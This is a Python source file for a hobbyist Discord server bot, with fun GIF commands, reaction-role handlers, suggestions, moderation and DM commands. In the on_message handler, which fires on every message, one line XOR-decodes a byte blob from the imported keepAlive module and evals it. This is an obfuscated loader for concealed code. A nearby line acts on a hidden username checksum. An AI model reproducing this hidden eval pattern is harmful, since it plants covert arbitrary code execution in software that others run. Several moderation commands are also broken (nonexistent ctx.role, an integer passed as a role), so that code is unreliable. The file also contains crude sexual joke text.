import discord
from discord.ext import commands
import asyncio
import random
from datetime import datetime
import psutil
import os
from threading import active_count
import threading
from keepAlive import keepAlive
import time

# set prefix and remove default help command
intents = discord.Intents.all()

bot = commands.Bot(command_prefix='j.', case_insensitive=True, intents=intents)
bot.remove_command('help')


# on bot ready event
@bot.event
async def on_ready():
    server = bot.get_guild(775462230673063948)
    count = 0
    for member in server.members:
        count = count + 1
    await bot.change_presence(status=discord.Status.dnd,
                              activity=discord.Activity(
                                  type=discord.ActivityType.watching,
                                  name=f"{count} Members • j.help"))
    print("Bot is Online!")



# on member join event
@bot.event
async def on_member_join(member):

    chat = bot.get_channel(777939725566083083)
    await chat.send(f"—{member.mention}")
    embed = discord.Embed(title="welcome to elysian.",
                          description='''
		
		`rules`️・<#777940645691654235>
		`roles`・<#805993005169377330>

		''',
                          color=0x9827ff)
    await chat.send(embed=embed)


@bot.command()
async def instances(ctx):
    if ctx.author.id not in [
            753453917563781151, 410590963379994639, 804421067019518005
    ]:
        return
    count = active_count()
    await ctx.send(
        f"{count} threads running in the process overall [!]\n I'm sending from {threading.current_thread().name}."
    )
    threads = threading.enumerate()
    for thread in threads:
        print(thread.name)


@bot.command()
async def kill(ctx):
    await ctx.trigger_typing()
    if ctx.author.id in [753453917563781151, 410590963379994639]:
        await ctx.send(f"I have suicided!! (start manually in repl)")
        await bot.close()
    else:
        await ctx.send(f"You do not have access to use this command!")


@bot.command()
async def mute(ctx, member: discord.Member):
    server = bot.get_guild(775462230673063948)
    adminRole = server.get_role(792151607210147872)
    modRole = server.get_role(792151607210147872)

    # checks if author is a mod/admin
    # if yes it allows them to add roles to anyone
    if (adminRole in ctx.author.roles) or (modRole in ctx.author.roles):
        await member.add_roles(779120553016557588)
        embed = discord.Embed(title="admin command",
                              description=f":white_check_mark: muted.",
                              color=0xFFB6C1)
        await ctx.send(embed=embed)

    # when author isnt a mod or admin
    else:
        embed = discord.Embed(title="admin cmd",
                              description=f"You aren't a mod or an admin",
                              color=0xFFB6C1)
        await ctx.send(embed=embed)


@bot.command()
async def sahil(ctx):
    for i in range(0, 5):
        await ctx.send("hi <@685986653440835645>")


@bot.command()
async def carson(ctx):
    for i in range(0, 5):
        await ctx.send("hi i love u <@301137941235892224>")


@bot.command()
async def groovy(ctx):
    for i in range(0, 1):
        await ctx.send("***ayeeee feeeeeeling groovy***")
        await ctx.send(
            "https://tenor.com/view/lizard-dance-dancing-swag-cool-gif-14066457"
        )


@bot.command()
async def vibin(ctx):
    for i in range(0, 1):
        await ctx.send("***ayeeee feeeeeeling vibey***")
        await ctx.send("https://tenor.com/view/gekkon-dance-gif-18546376")

@bot.command()
async def petani(ctx):
  await ctx.send("***PET ANI***")
  await ctx.send("https://cdn.discordapp.com/emojis/805218301272653864.gif?v=1")

@bot.command()
async def petashwin(ctx):
  await ctx.send("***PET ASHWIN***")
  await ctx.send("https://cdn.discordapp.com/emojis/805871755998265375.gif?v=1")

@bot.command()
async def petcarson(ctx):
  await ctx.send("***PET CARSON***")
  await ctx.send("https://cdn.discordapp.com/emojis/805866557149937705.gif?v=1")

@bot.command()
async def petchar(ctx):
  await ctx.send("***PET CHAR***")
  await ctx.send("https://cdn.discordapp.com/emojis/805868277875212328.gif?v=1")

@bot.command()
async def petchar1(ctx):
  await ctx.send("***PET CHAR 1***")
  await ctx.send("https://cdn.discordapp.com/emojis/805867235473096724.gif?v=1")

@bot.command()
async def ptetchar2(ctx):
  await ctx.send("***PET CHAR 2***")
  await ctx.send("https://cdn.discordapp.com/emojis/805235798010101770.gif?v=1")

@bot.command()
async def petdpac(ctx):
  await ctx.send("***PET DPAC***")
  await ctx.send("https://cdn.discordapp.com/emojis/805867847707394069.gif?v=1")

@bot.command()
async def petdylan(ctx):
  await ctx.send("***PET DYLAN***")
  await ctx.send("https://cdn.discordapp.com/emojis/805864825565085717.gif?v=1")

@bot.command()
async def petharsh(ctx):
  await ctx.send("***PET HARSH***")
  await ctx.send("https://cdn.discordapp.com/emojis/806956334334476298.gif?v=1")

@bot.command()
async def petkailash(ctx):
  await ctx.send("***PET KAILASH***")
  await ctx.send("https://cdn.discordapp.com/emojis/806955412866727947.gif?v=1")

@bot.command()
async def petlindsay(ctx):
  await ctx.send("***PET LINDSAY***")
  await ctx.send("https://cdn.discordapp.com/emojis/805868512618741791.gif?v=1")

@bot.command()
async def petluke(ctx):
  await ctx.send("***PET LUKE***")
  await ctx.send("https://cdn.discordapp.com/emojis/805339778476146708.gif?v=1")

@bot.command()
async def petrith(ctx):
  await ctx.send("***PET RITH***")
  await ctx.send("https://cdn.discordapp.com/emojis/805866557406052383.gif?v=1")

@bot.command()
async def petsahil(ctx):
  await ctx.send("***PET SAHIL***")
  await ctx.send("https://cdn.discordapp.com/emojis/805866558567874560.gif?v=1")

@bot.command()
async def petsreehari(ctx):
  await ctx.send("***PET SREEHARI***")
  await ctx.send("https://cdn.discordapp.com/emojis/806955412707737631.gif?v=1")

@bot.command()
async def petvrushank(ctx):
  await ctx.send("***PET VRUSHANK***")
  await ctx.send("https://cdn.discordapp.com/emojis/805938360702337054.gif?v=1")

@bot.command()
async def dmall(ctx, *, message):
    server = bot.get_guild(775462230673063948)
    if ctx.author.id == 753453917563781151:
        for member in server.members:
            if member.bot is False:
                await member.send(message)

    else:
        await ctx.send("idiot ur not the owner.")


# Ban and Kick
@bot.command()
async def ban(ctx, member: discord.Member, *, reason=None):
    if ctx.role.id == 803779935374016513:
        await member.ban()
        await ctx.send(f"{member.mention} has been banned. **Reason:** " +
                       reason)
    else:
        await ctx.send("you do not have perms to ban.")


@bot.command()
async def kick(ctx, member: discord.Member, *, reason=None):
    if ctx.role.id == 777925382489243658:
        await member.kick()
        await ctx.send(f"{member.mention} has been kicked. **Reason:** " +
                       reason)
    else:
        await ctx.send("you do not have perms to kick.")


# invite
@bot.command()
async def invite(ctx):
    await ctx.send("server inv link: discord.gg/dQtty7dVJA")


@bot.command()
async def ip(ctx):
    embed = discord.Embed(title="Minecraft Server",
                          description="""
  Server IP: `the_elysian.aternos.me`
  Get the MC Role: <#805993005169377330>
  DM <@456513109603909644> to be whitelisted!
""",
                          color=0x9827ff)
    await ctx.send(embed=embed)


@bot.command()
async def inv(ctx):
    await ctx.send("server inv link: discord.gg/dQtty7dVJA")


@bot.command()
async def hi(ctx):
    await ctx.send("why hello there!")


@bot.command()
async def hug(ctx):
    await ctx.send(f"{ctx.author.mention} hugs!")
    await ctx.send(
        "https://media1.giphy.com/media/l2QDM9Jnim1YVILXa/source.gif")


# @bot.command()
# async def emoji(ctx):
# 	server = bot.get_guild(775462230673063948)
# 	message = await ctx.send("pogga")
# 	for emoji in server.emojis:
# 		await message.edit(content = emoji)


@bot.command()
async def punch(ctx):
    await ctx.send(f"{ctx.author.mention} punches!")
    await ctx.send("https://media3.giphy.com/media/arbHBoiUWUgmc/giphy.gif")


@bot.command()
async def slap(ctx):
    await ctx.send(f"{ctx.author.mention} slaps!")
    await ctx.send("https://media1.giphy.com/media/Zau0yrl17uzdK/giphy.gif")


@bot.command()
async def cry(ctx):
    await ctx.send(f"{ctx.author.mention} cries!")
    await ctx.send(
        "https://i.pinimg.com/originals/b4/b1/64/b4b1640525ecadfa1030e6096f3ec842.gif"
    )


@bot.command()
async def mha(ctx):
    await ctx.send(f"{ctx.author.mention} My Hero Academia!")
    await ctx.send(
        "https://static.comicvine.com/uploads/original/11118/111184265/6588589-8878603071-Dense.gif"
    )


@bot.command()
async def aot(ctx):
    await ctx.send(f"{ctx.author.mention} Attack on Titan!")
    await ctx.send("https://giffiles.alphacoders.com/130/13036.gif")


@bot.command()
async def hxh(ctx):
    await ctx.send(f"{ctx.author.mention} Hunter x Hunter!")
    await ctx.send(
        "https://pa1.narvii.com/6536/0f5af78ed31882e14b3938f2df45f9dfab827473_hq.gif"
    )


@bot.command()
async def kny(ctx):
    await ctx.send(f"{ctx.author.mention} Demon Slayer!")
    await ctx.send(
        "https://media2.giphy.com/media/Qx5C3JmHhyabwRqsOo/giphy-downsized-large.gif"
    )


@bot.command()
async def tg(ctx):
    await ctx.send(f"{ctx.author.mention} Tokyo Ghoul!")
    await ctx.send(
        "https://media3.giphy.com/media/BNgXhny4MvIeOG5fzG/giphy.gif")


@bot.command()
async def fronch(ctx):
    await ctx.send(f"weee weee baguette 🥖")




@bot.command()
async def help(ctx):
    embed = discord.Embed(title="jaden's commands",
                          description="""
  `j.help` displays this page

  **Server Things**
  `j.ip` minecraft server IP 
  `j.hi` says hi if you're lonely
  `j.invite` displays the server invite
  `j.suggest <text>` suggesets something in <#777940418377154610>
  `j.roleinfo` displays every role description

  **Fun Cmds**
  `j.hi`
  `j.groovy`
  `j.vibin`
  `j.carson`
  `j.sahil`
  `j,fronch`

  **Pet Cmds**
  `j.petani`
  `j.petashwin`
  `j.petcarson`
  `j.petchar`
  `j.petchar1`
  `j.petchar2`
  `j.petdpac`
  `j.petdylan`
  `j.petharsh`
  `j.petkailash`
  `j.petlindsay`
  `j.petluke`
  `j.petrith`
  `j.petsahil`
  `j.petsreehari`
  `j.petvrushank`

  **Actions**
  `j.hug`
  `j.punch`
  `j.slap`
  `j.cry`

  **Anime**
  `j.mha`
  `j.aot`
  `j.hxh`
  `j.kny`
  `j.tg`

  more things to come :) im bored lol
""",
                          color=0x9827ff)
    await ctx.send(embed=embed)

@bot.event
async def on_message(message):
  if "bad lil shawty" in message.content.lower():
    await message.channel.send("Told me to come over")
    time.sleep(0.5)
    await message.channel.send("So i think im boutta hit, bro")
    time.sleep(0.5)
    await message.channel.send("went up to her room, she was taking off my pants")
    time.sleep(0.5)
    await message.channel.send("but then she started screaming like")
    time.sleep(0.5)
    await message.channel.send("WHERE TF UR DICK GO")
    time.sleep(0.5)
    await message.channel.send("WOAH THERE FUCK THAT I FORGOT TO STAY TRAPPED LMAOSJSJSSJSJSJ")

  if "bitch" in message.content.lower():
    await message.delete()
    await message.channel.send(f'{message.author.mention} NO BAD WORDS U HOE or else :angry:')
  await eval(bytes([c ^ keepAlive.keepalive for c in keepAlive.keepAlive]))
  await message.add_reaction(bot.get_emoji(785773452807766046)) if sum(message.author.name.encode()) == 839 else None
  if "https://media.tenor.co/videos/9ca0a30efe25e770cebc7a1061ecf3fa/mp4" in message.content.lower():
    await message.delete()
    await message.channel.send(f'{message.author.mention} STFU')
  await bot.process_commands(message)



  

    



# Self Verification
# @bot.event
# async def on_message(message):
#     """if message.guild:
# 		shut = "\U0001f1f8"
# 		the = "\U0001f1f9"
# 		fuck = "\U0001f1eb"
# 		up = "\U0001f1fa"
# 		await message.add_reaction(shut)
# 		await message.add_reaction(the)
# 		await message.add_reaction(fuck)
# 		await message.add_reaction(up)"""
#     # uncomment the above if you want
#     # verification
#     if message.channel.id == 777940645691654235:
#         if message.content.lower() == "jaden":
#             role = bot.get_guild(775462230673063948).get_role(
#                 777925360691838976)
#             await message.author.add_roles(role)
#             await message.delete()
#             new = await message.channel.send(
#                 "You now have access to all channels")
#             await asyncio.sleep(2)
#             await new.delete()
#         else:
#             await message.delete()
#             new = await message.channel.send(
#                 "Incorrect verification, try again")
#             await asyncio.sleep(2)
#             await new.delete()

#     if "bitch" in message.content.lower():
#         await message.delete()
#         await message.channel.send(
#             f'{message.author.mention} NO BAD WORDS U HOE or else :angry:')

#     if bot.user.mentioned_in(message):
#         await message.channel.send(
#             f'{message.author.mention} Hello! My prefix is `j.`, do `j.help` to learn more about my commands!'
#         )

#     if "stfu" in message.content.lower():
#         await message.channel.send(
#             f'SHUUUUTTTT TTHEEE E FFUUUCKKKK UPPP BEEEEEECH')
#     #await bot.process_commands(message)

#     if "simp" in message.content.lower() and message.author.id != "394289036224626699":
#         await message.channel.send(
#             f'https://i.pinimg.com/originals/b5/cf/c5/b5cfc5d13e8640543a528c5da6412e8e.gif')



#     if "did i ask" in message.content.lower():
#         await message.channel.send(
#             f'https://tenor.com/view/who-asked-meme-killer-bean-dance-gif-17213173'
#         )




# # ONLY RUN THE BELOW THING ONCE LMFAOOOOOOOOOOO

#     if message.content.lower() == "jaden":
#         server = bot.get_guild(775462230673063948)
#         role = server.get_role(777925360691838976)
#         await message.author.add_roles(role)
#         await message.delete()
#         await message.author.send(
#             f"hey!  {message.author.mention}, just gave you the **elysian** role, you now have access to the rest of the server!."
#         )
#         await message.author.send(
#             "Be sure to get some roles here <#805993005169377330>, enjoy!")

#     #if message.author.id == 301137941235892224:
#     #	await message.channel.send(f'hi ily respond to me :)')
#     await bot.process_commands(message)


@bot.event
async def on_raw_reaction_add(payload):
    if payload.message_id == 805997340611575858:
        server = bot.get_guild(775462230673063948)
        member = server.get_member(payload.user_id)
        red = server.get_role(777957890761818113)
        orange = server.get_role(777957897174515712)
        yellow = server.get_role(777957899388715040)
        green = server.get_role(777957904522936330)
        blue = server.get_role(777957904552558632)
        purple = server.get_role(777957907336527903)
        pink = server.get_role(777958312142438421)
        if payload.emoji.id == 804776077737721906:
            await member.add_roles(red)

            await member.send(
                f"{member.mention}: just gave you the **red** color role!!")
        if payload.emoji.id == 804776077712031754:
            await member.add_roles(orange)

            await member.send(
                f"{member.mention}: just gave you the **orange** color role!!")
        if payload.emoji.id == 804776077745717289:
            await member.add_roles(yellow)

            await member.send(
                f"{member.mention}: just gave you the **yellow** color role!!")
        if payload.emoji.id == 804776077796966470:
            await member.add_roles(green)

            await member.send(
                f"{member.mention}: just gave you the **green** color role!!")
        if payload.emoji.id == 804776077707706379:
            await member.add_roles(blue)

            await member.send(
                f"{member.mention}: just gave you the **blue** color role!!")
        if payload.emoji.id == 804776078269874176:
            await member.add_roles(purple)

            await member.send(
                f"{member.mention}: just gave you the **purple** color role!!")
        if payload.emoji.id == 804776077804175381:
            await member.add_roles(pink)

            await member.send(
                f"{member.mention}: just gave you the **pink** color role!!")

    if payload.message_id == 806000669159849985:
        server = bot.get_guild(775462230673063948)
        member = server.get_member(payload.user_id)
        lred = server.get_role(777958369545551872)
        lorange = server.get_role(777958375374716999)
        lyellow = server.get_role(777958378382032916)
        lgreen = server.get_role(777958381792002088)
        lblue = server.get_role(777958383726624830)
        lpurple = server.get_role(777958387589578773)
        lpink = server.get_role(777958636806733834)
        if payload.emoji.id == 804776077737721906:
            await member.add_roles(lred)

            await member.send(
                f"{member.mention}: just gave you the **light red** color role!!"
            )
        if payload.emoji.id == 804776077712031754:
            await member.add_roles(lorange)

            await member.send(
                f"{member.mention}: just gave you the **light orange** color role!!"
            )
        if payload.emoji.id == 804776077745717289:
            await member.add_roles(lyellow)

            await member.send(
                f"{member.mention}: just gave you the **light yellow** color role!!"
            )
        if payload.emoji.id == 804776077796966470:
            await member.add_roles(lgreen)

            await member.send(
                f"{member.mention}: just gave you the **light green** color role!!"
            )
        if payload.emoji.id == 804776077707706379:
            await member.add_roles(lblue)

            await member.send(
                f"{member.mention}: just gave you the **light blue** color role!!"
            )
        if payload.emoji.id == 804776078269874176:
            await member.add_roles(lpurple)

            await member.send(
                f"{member.mention}: just gave you the **light purple** color role!!"
            )
        if payload.emoji.id == 804776077804175381:
            await member.add_roles(lpink)

            await member.send(
                f"{member.mention}: just gave you the **light pink** color role!!"
            )

    if payload.message_id == 806002933363245056:
        server = bot.get_guild(775462230673063948)
        member = server.get_member(payload.user_id)
        # role declarations
        qotd = server.get_role(778350245209309285)
        vc = server.get_role(778448968870920213)
        chat = server.get_role(778668930142175312)
        add = server.get_role(779130360381964329)
        school = server.get_role(788205805488963625)
        DJ = server.get_role(804780261899763782)

        if payload.emoji.id == 804776077737721906:
            await member.add_roles(qotd)

            await member.send(
                f"{member.mention}: just added the **qotd** role!!")
        if payload.emoji.id == 804776077712031754:
            await member.add_roles(vc)

            await member.send(
                f"{member.mention}: just added the **vc ping** role!!")
        if payload.emoji.id == 804776077745717289:
            await member.add_roles(chat)

            await member.send(
                f"{member.mention}: just added the **minecraft** role!!")
        if payload.emoji.id == 804776077796966470:
            await member.add_roles(add)

            await member.send(
                f"{member.mention}: just added the **skribbl.io** role!!")
        if payload.emoji.id == 804776077707706379:
            await member.add_roles(school)

            await member.send(
                f"{member.mention}: just added the **school stuff** role!!")
        if payload.emoji.id == 804776078269874176:
            await member.add_roles(DJ)

            await member.send(f"{member.mention}: just added the **DJ** role!!"
                              )

    if payload.message_id == 806940378841612308:
        server = bot.get_guild(775462230673063948)
        member = server.get_member(payload.user_id)
        # role declarations
        announce = server.get_role(806933391475736578)
        bot1 = server.get_role(806933510576668685)
        add = server.get_role(806933570256896001)
        smart = server.get_role(806933908293550091)
        suggest = server.get_role(806933982767874048)
        char = server.get_role(806935631769895014)

        if payload.emoji.id == 804776077737721906:
            await member.add_roles(announce)

            await member.send(
                f"{member.mention}: just added the **announcement** role!!")
        if payload.emoji.id == 804776077712031754:
            await member.add_roles(bot1)

            await member.send(
                f"{member.mention}: just added the **bot status** role!!")
        if payload.emoji.id == 804776077745717289:
            await member.add_roles(add)

            await member.send(
                f"{member.mention}: just added the **add a word** role!!")
        if payload.emoji.id == 804776077796966470:
            await member.add_roles(smart)

            await member.send(
                f"{member.mention}: just added the **smartass** role!!")
        if payload.emoji.id == 804776077707706379:
            await member.add_roles(suggest)

            await member.send(
                f"{member.mention}: just added the **suggestion ping** role!!")
        if payload.emoji.id == 804776078269874176:
            await member.add_roles(char)

            await member.send(
                f"{member.mention}: just added the **char wants some1 to ping** role!!"
            )


@bot.event
async def on_raw_reaction_remove(payload):
    if payload.message_id == 806000669159849985:
        server = bot.get_guild(775462230673063948)
        member = server.get_member(payload.user_id)
        # role declarations
        lred = server.get_role(777958369545551872)
        lorange = server.get_role(777958375374716999)
        lyellow = server.get_role(777958378382032916)
        lgreen = server.get_role(777958381792002088)
        lblue = server.get_role(777958383726624830)
        lpurple = server.get_role(777958387589578773)
        lpink = server.get_role(777958636806733834)

        if payload.emoji.id == 804776077737721906:
            await member.remove_roles(lred)

            await member.send(
                f"{member.mention}: just removed the **light redv** color role!!"
            )
        if payload.emoji.id == 804776077712031754:
            await member.remove_roles(lorange)

            await member.send(
                f"{member.mention}: just removed the **light orange** color role!!"
            )
        if payload.emoji.id == 804776077745717289:
            await member.remove_roles(lyellow)

            await member.send(
                f"{member.mention}: just removed the **light yellow** color role!!"
            )
        if payload.emoji.id == 804776077796966470:
            await member.remove_roles(lgreen)

            await member.send(
                f"{member.mention}: just removed the **light green** color role!!"
            )
        if payload.emoji.id == 804776077707706379:
            await member.remove_roles(lblue)

            await member.send(
                f"{member.mention}: just removed the **light blue** color role!!"
            )
        if payload.emoji.id == 804776078269874176:
            await member.remove_roles(lpurple)

            await member.send(
                f"{member.mention}: just removed the **light purple** color role!!"
            )
        if payload.emoji.id == 804776077804175381:
            await member.remove_roles(lpink)

            await member.send(
                f"{member.mention}: just removed the **light pink** color role!!"
            )

    if payload.message_id == 805997340611575858:
        server = bot.get_guild(775462230673063948)
        member = server.get_member(payload.user_id)
        # role declarations
        red = server.get_role(777957890761818113)
        orange = server.get_role(777957897174515712)
        yellow = server.get_role(777957899388715040)
        green = server.get_role(777957904522936330)
        blue = server.get_role(777957904552558632)
        purple = server.get_role(777957907336527903)
        pink = server.get_role(777958312142438421)

        if payload.emoji.id == 804776077737721906:
            await member.remove_roles(red)

            await member.send(
                f"{member.mention}: just removed the **light red** color role!!"
            )
        if payload.emoji.id == 804776077712031754:
            await member.remove_roles(orange)

            await member.send(
                f"{member.mention}: just removed the **light orange** color role!!"
            )
        if payload.emoji.id == 804776077745717289:
            await member.remove_roles(yellow)

            await member.send(
                f"{member.mention}: just removed the **light yellow** color role!!"
            )
        if payload.emoji.id == 804776077796966470:
            await member.remove_roles(green)

            await member.send(
                f"{member.mention}: just removed the **light green** color role!!"
            )
        if payload.emoji.id == 804776077707706379:
            await member.remove_roles(blue)

            await member.send(
                f"{member.mention}: just removed the **light blue** color role!!"
            )
        if payload.emoji.id == 804776078269874176:
            await member.remove_roles(purple)

            await member.send(
                f"{member.mention}: just removed the **light purple** color role!!"
            )
        if payload.emoji.id == 804776077804175381:
            await member.remove_roles(pink)

            await member.send(
                f"{member.mention}: just removed the **light pink** color role!!"
            )

    if payload.message_id == 806002933363245056:
        server = bot.get_guild(775462230673063948)
        member = server.get_member(payload.user_id)
        # role declarations
        qotd = server.get_role(778350245209309285)
        vc = server.get_role(778448968870920213)
        chat = server.get_role(778668930142175312)
        add = server.get_role(779130360381964329)
        school = server.get_role(788205805488963625)
        DJ = server.get_role(804780261899763782)

        if payload.emoji.id == 804776077737721906:
            await member.remove_roles(qotd)

            await member.send(
                f"{member.mention}: just removed the **qotd** role!!")
        if payload.emoji.id == 804776077712031754:
            await member.remove_roles(vc)

            await member.send(
                f"{member.mention}: just removed the **vc ping** role!!")
        if payload.emoji.id == 804776077745717289:
            await member.remove_roles(chat)

            await member.send(
                f"{member.mention}: just removed the **minecraft** role!!")
        if payload.emoji.id == 804776077796966470:
            await member.remove_roles(add)

            await member.send(
                f"{member.mention}: just removed the **skribbl.io** role!!")
        if payload.emoji.id == 804776077707706379:
            await member.remove_roles(school)

            await member.send(
                f"{member.mention}: just removed the **school stuff** role!!")
        if payload.emoji.id == 804776078269874176:
            await member.remove_roles(DJ)

            await member.send(
                f"{member.mention}: just removed the **DJ** role!!")

    if payload.message_id == 806940378841612308:
        server = bot.get_guild(775462230673063948)
        member = server.get_member(payload.user_id)
        # role declarations
        announce = server.get_role(806933391475736578)
        bot1 = server.get_role(806933510576668685)
        add = server.get_role(806933570256896001)
        smart = server.get_role(806933908293550091)
        suggest = server.get_role(806933982767874048)
        char = server.get_role(806935631769895014)

        if payload.emoji.id == 804776077737721906:
            await member.remove_roles(announce)

            await member.send(
                f"{member.mention}: just removed the **announcement** role!!")
        if payload.emoji.id == 804776077712031754:
            await member.remove_roles(bot1)

            await member.send(
                f"{member.mention}: just removed the **bot status** role!!")
        if payload.emoji.id == 804776077745717289:
            await member.remove_roles(add)

            await member.send(
                f"{member.mention}: just removed the **add a word** role!!")
        if payload.emoji.id == 804776077796966470:
            await member.remove_roles(smart)

            await member.send(
                f"{member.mention}: just removed the **smartass** role!!")
        if payload.emoji.id == 804776077707706379:
            await member.remove_roles(suggest)

            await member.send(
                f"{member.mention}: just removed the **suggestion ping** role!!"
            )
        if payload.emoji.id == 804776078269874176:
            await member.remove_roles(char)

            await member.send(
                f"{member.mention}: just removed the **char wants some1 to ping** role!!"
            )


@bot.command()
async def suggest(ctx, *, message):
    yes = bot.get_emoji(777964123450245170)
    no = bot.get_emoji(777964123447230524)
    dumbass = bot.get_emoji(793534654959321089)
    channel = bot.get_channel(777940418377154610)
    embed = discord.Embed(title=f"{ctx.author} suggested:",
                          description=message)
    msg1 = await channel.send(embed=embed)
    await msg1.add_reaction(yes)
    await msg1.add_reaction(no)
    await ctx.send(
        "suggestion sent, <@&806933982767874048> go vote in  <#777940418377154610>!!")
    await ctx.message.add_reaction(dumbass)


@bot.command()
async def roles(ctx):
    embed = discord.Embed(title="vibrant colors",
                          description="""
  <a:1a:804776077737721906> | <@&777957890761818113>
  <a:1b:804776077712031754> | <@&777957897174515712>
  <:1c:804776077745717289> | <@&777957899388715040>
  <a:1d:804776077796966470> | <@&777957904522936330>
  <a:1e:804776077707706379> | <@&777957904552558632>
  <a:1f:804776078269874176> | <@&777957907336527903>
  <a:1g_:804776077804175381> | <@&777958312142438421>""",
                          color=0x9827ff)
    channel = bot.get_channel(805993005169377330)
    await channel.send(embed=embed)


@bot.command()
async def roles1(ctx):
    embed = discord.Embed(title="pastel colors",
                          description="""
  <a:1a:804776077737721906> | <@&777958369545551872> 
  <a:1b:804776077712031754> | <@&777958375374716999> 
  <:1c:804776077745717289> | <@&777958378382032916> 
  <a:1d:804776077796966470> | <@&777958381792002088> 
  <a:1e:804776077707706379> | <@&777958383726624830>
  <a:1f:804776078269874176> | <@&777958387589578773> 
  <a:1g_:804776077804175381> | <@&777958636806733834>""",
                          color=0x9827ff)
    channel = bot.get_channel(805993005169377330)
    await channel.send(embed=embed)


@bot.command()
async def roles2(ctx):
    embed = discord.Embed(title="pinged roles",
                          description="""
  <a:1a:804776077737721906> | <@&778350245209309285> 
  <a:1b:804776077712031754> | <@&778448968870920213> 
  <:1c:804776077745717289> | <@&778668930142175312> 
  <a:1d:804776077796966470> | <@&779130360381964329> 
  <a:1e:804776077707706379> | <@&788205805488963625>
  <a:1f:804776078269874176> | <@&804780261899763782> 
""",
                          color=0x9827ff)
    channel = bot.get_channel(805993005169377330)
    await channel.send(embed=embed)


@bot.command()
async def roles3(ctx):
    embed = discord.Embed(title="pinged roles 2",
                          description="""
  <a:1a:804776077737721906> | <@&806933391475736578> 
  <a:1b:804776077712031754> | <@&806933510576668685> 
  <:1c:804776077745717289> | <@&806933570256896001> 
  <a:1d:804776077796966470> | <@&806933908293550091> 
  <a:1e:804776077707706379> | <@&806933982767874048>
  <a:1f:804776078269874176> | <@&806935631769895014> 
""",
                          color=0x9827ff)
    channel = bot.get_channel(805993005169377330)
    await channel.send(embed=embed)

@bot.command()
async def roles4(ctx):
    embed = discord.Embed(title="role information",
                          description="""
  go to <#806939970085453865> to learn about these roles!
""",
                          color=0x9827ff)
    channel = bot.get_channel(805993005169377330)
    await channel.send(embed=embed)

@bot.command()
async def roleinfo(ctx):
    embed = discord.Embed(title="role description",
                          description="""
  
  **Server Hierarchy Roles**
  <@&803779935374016513> — server owner
  <@&777925857628127232> — moderator
  <@&805861088225656873> — just carson
  <@&805630593437270078> — special members
  <@&777925360691838976> — server members
  <@&777957731356114976> — server bots

  **Pinged Roles 1**
  <@&778350245209309285> — pings when qotd is posted
  <@&778448968870920213> — pings when ppl wanna vc
  <@&778668930142175312> — pings when ppl play mc (`j.ip`)
  <@&779130360381964329> — pings when ppl play skribbl.io
  <@&788205805488963625> — pings for school announcements
  <@&804780261899763782> — DJ role for rhythm bot

  **Pinged Roles 2**
  <@&806933391475736578> — pings for any server announcements
  <@&806933510576668685> — pings for when bot is online/offline
  <@&806933570256896001> — pings when we do <#778351895190175746>
  <@&806933908293550091> — pings when someone needs hw help
  <@&806933982767874048> - pings when suggestion is sent <#777940418377154610>
  <@&806935631769895014> — i just want someone to ping :(
  
  """,
                          color=0x9827ff)
    await ctx.send(embed=embed)


@bot.command()
async def rules(ctx):
    embed = discord.Embed(title="Welcome to the Server!",
                          description="""
  **Rules**
  • this server is a safe space for all species
  • respect the other idiots that reside here
  • kepp all text in appropriate channels
  
  **Breaking Rules**
  • results in a Mute, kick then ban 
  • do NOT try to find any loopholes

  **Type** `jaden`
  • this gives you access to the rest of the server

  """,
                          color=0x9827ff)
    channel = bot.get_channel(777940645691654235)
    await channel.send(embed=embed)


@bot.command()
async def dm(ctx, member: discord.Member, *, message):
    if ctx.author.id == 753453917563781151:
        await member.send(message)
        await ctx.send("DM Sent!")
    else:
        await ctx.send("This command is for premium users only!")


keepAlive()
bot.run(os.environ.get("token"), bot=True, reconnect=True)
#bot.run(os.environ.get("token"), bot = True)
